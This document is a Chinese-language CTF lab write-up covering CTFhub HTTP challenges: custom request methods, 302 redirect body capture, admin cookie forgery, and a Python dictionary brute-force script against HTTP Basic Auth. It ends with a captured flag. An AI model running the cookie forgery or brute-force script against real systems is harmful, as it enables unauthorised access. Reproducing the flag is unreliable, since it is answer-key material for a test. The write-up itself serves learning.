# CTFhub Web 实战日志：HTTP 协议基础攻防

> **Author:** Zuo Qixuan
> **Date:** 2026-04-09
> **Focus:** Web Security, HTTP Protocol Manipulation, State Management
> **Core Concept:** 浏览器会受制于 RFC 规范，但黑客工具可以操控底层 HTTP 纯文本报文。永远不要相信客户端提交的数据。

##  0x01 请求方式 (HTTP Method Forge)

###  原理简述
标准的 HTTP 请求通常使用 `GET` 或 `POST` 方法。但在应用层（Layer 7），HTTP 报文的本质只是一段具有特定格式的字符串。如果服务器端没有对请求方法进行严格的白名单校验，或者刻意设定了隐藏规则，黑客可以通过伪造请求报文的第一行（请求行），强行使用非标准的方法与服务器交互。

###  漏洞利用 (Exploit)
题目要求必须使用自定义方法 `CTFHUB` 去请求 `/index.php`。

**方法一：使用 cURL (命令行渗透)**
利用 `-X` 参数强行指定请求方法：
```bash
# -X 指定方法，直接获取 Flag
curl -X CTFHUB http://<Target_IP>:<Port>/index.php
```

**方法二：使用 Python `requests` (自动化武器库)**
利用 `request` 底层方法绕过浏览器的 `get/post` 限制：
```python
import requests

url = "http://<Target_IP>:<Port>/index.php"
# 发送非标准 HTTP 方法
response = requests.request("CTFHUB", url)
print(response.text)
```

---

##  0x02 302 跳转 (HTTP 302 Redirect Bypass)

### 原理简述
当服务器返回 HTTP `302 Found` 状态码，并在 Header 中附带 `Location` 字段时，现代浏览器会**自动且瞬间**发起对新地址的第二次请求。
**漏洞点：** 如果开发者将机密信息（如 Flag）写在了 302 响应包的**正文 (Body)** 中，普通浏览器用户根本无法察觉，因为页面已经被自动跳转到了一个无价值的页面（如 `no_flag_here.php`）。

### 漏洞利用 (Exploit)
核心思路是**拦截并禁止自动重定向**，截获服务器的第一层响应。

**方法一：使用 cURL**
cURL 默认不跟随重定向，使用 `-i` 打印包含 Header 的完整报文：
```bash
# 必须请求触发 302 的源页面 index.php
curl -i http://<Target_IP>:<Port>/index.php
```

**方法二：使用 Python `requests`**
通过 `allow_redirects=False` 强制接管控制权：
```python
import requests

url = "http://<Target_IP>:<Port>/index.php"
# 禁用自动跟随重定向，捕获原始 302 报文
response = requests.get(url, allow_redirects=False)

print("[HTTP Headers]:", response.headers)
print("[HTTP Body containing Flag]:\n", response.text)
```

---

##  0x03 Cookie 欺骗 (Cookie Spoofing / Forgery)

###  原理简述
HTTP 协议本身是“无状态 (Stateless)”的。为了维持登录状态，服务器会在客户端硬盘/内存中植入 Cookie。
**漏洞点：** 如果服务器过度信任客户端提交的 Cookie（例如：仅仅验证 `admin=0` 或 `admin=1`），且没有对 Cookie 进行签名加密（如 JWT 或 Session 机制），攻击者就可以在本地随意篡改 Cookie 字段，实现权限提升（越权访问）。

###  漏洞利用 (Exploit)

**方法一：Browser DevTools (最直接的白刃战)**
1. 按 `F12` 打开浏览器开发者工具。
2. 进入 `Application` (或 `Storage`) -> `Cookies`。
3. 找到名为 `admin`（或类似权限字段）的键，将其值从 `0` 修改为 `1`。
4. 刷新页面，带着伪造的“手环”通过服务器验证，获取 Flag。

**方法二：使用 Python 注入伪造 Cookie**
在自动化渗透脚本中，通过字典直接向 Header 中注入恶意 Cookie：
```python
import requests

url = "http://<Target_IP>:<Port>/index.php"
# 构造提权 Cookie
forged_cookies = {
    "admin": "1"
}

# 携带伪造身份发起请求
response = requests.get(url, cookies=forged_cookies)
print(response.text)
```

---
###  总结
这三个靶场揭示了 Web 安全的基石：**永远不要相信客户端发来的任何数据**。无论是 Method、行为路径，还是 Cookie，只要它在 HTTP 报文里，它就是可以被黑客任意揉捏的面团。





# 🛡️ CTFhub Web 实战日志：HTTP 协议基础攻防全集

> **Author:** Zuo Qixuan
> **Date:** 2026-04-10
> **Focus:** Web Security, Protocol Analysis, Brute Force Logic
> **Core Concept:** 渗透测试不只是运行脚本，而是对底层协议定义的极致理解。

---

## 🎯 0x01 请求方式 (HTTP Method Forge)

### 📌 原理简述
HTTP 报文的本质是特定格式的字符串。如果服务器端未对请求方法（Method）做白名单限制，攻击者可以通过构造非标准方法（如 `CTFHUB`）来触发特定的后端逻辑。

### 🚩 漏洞利用
```bash
# 使用 cURL 强行指定自定义方法
curl -X CTFHUB http://<Target_IP>:<Port>/index.php
```

---

## 🎯 0x02 302 跳转 (HTTP 302 Redirect Bypass)

### 📌 原理简述
`302 Found` 代表临时重定向。浏览器会自动跟随 `Location` 头跳转，从而忽略掉原始 302 响应体（Body）中的内容。
**核心思路：** 使用工具禁止自动重定向，截获第一层响应。

### 🚩 漏洞利用 (Python)
```python
import requests
# allow_redirects=False 是夺旗关键
response = requests.get(url, allow_redirects=False)
print(response.text)
```

---

## 🎯 0x03 Cookie 欺骗 (Cookie Spoofing)

### 📌 原理简述
HTTP 是无状态的，依靠 Cookie 维持身份。若服务器仅通过客户端可控的 Cookie 字段（如 `admin=0/1`）判断权限，则存在越权漏洞。

### 🚩 漏洞利用
1. **F12 开发者工具**：在 `Application -> Cookies` 中直接双击修改 `admin` 值为 `1`。
2. **刷新页面**：携带篡改后的身份凭证通过校验。

---

## 🎯 0x04 基础认证 (HTTP Basic Auth)

### 📌 原理简述
Basic Auth 要求在 Header 中携带 `Authorization: Basic <Base64(user:pass)>`。本题考查对**受保护路径**的自动化爆破能力。

### ⚠️ 逻辑陷阱：假阳性 (False Positive)
在编写爆破脚本时，**必须将请求目标对准受保护的资源路径（如 `/flag.html`）**，而不是不设防的主页（`/`）。
* **错误操作：** 对着主页跑字典。由于主页不设防，任何密码都会返回 `200 OK`，导致脚本误判爆破成功。
* **正确操作：** 对着返回 `401` 的页面跑字典，只有返回 `200` 时才是真密码。

### 🚩 自动化爆破脚本 (Python)
```python
import requests

# 1. 精确瞄准受保护的资源
url = "[http://challenge-xxx.ctfhub.com:10800/flag.html](http://challenge-xxx.ctfhub.com:10800/flag.html)"
username = "admin"
dictionary = r"C:\path\to\your\top100_password.txt"

with open(dictionary, "r") as f:
    for line in f:
        password = line.strip()
        # 利用 requests 内置的 auth 自动处理 Base64
        resp = requests.get(url, auth=(username, password))
        
        if resp.status_code == 200:
            print(f"🎯 命中真密码: {password}")
            print(f"🚩 Flag: {resp.text}")
            break
```

---

## 💡 战后复盘 (Retrospective)

1. **协议认知：** 基础认证是基于**资源路径**的质询。搞清楚“哪扇门上了锁”比“怎么捅锁”更重要。
2. **环境意识：** 动态靶场有生命周期（1小时），且每次重启可能随机化密码。
3. **工具边界：** 浏览器存在缓存、强制 HTTPS、代理重定向等干扰因子。在关键取旗阶段，**Python 脚本/cURL** 的原始报文交互比浏览器更诚实可靠。

---
**Status:** 🟩 All HTTP Basics Captured.
**Flag:** `ctfhub{bab7f2f722a9b86e4546b3f0}`
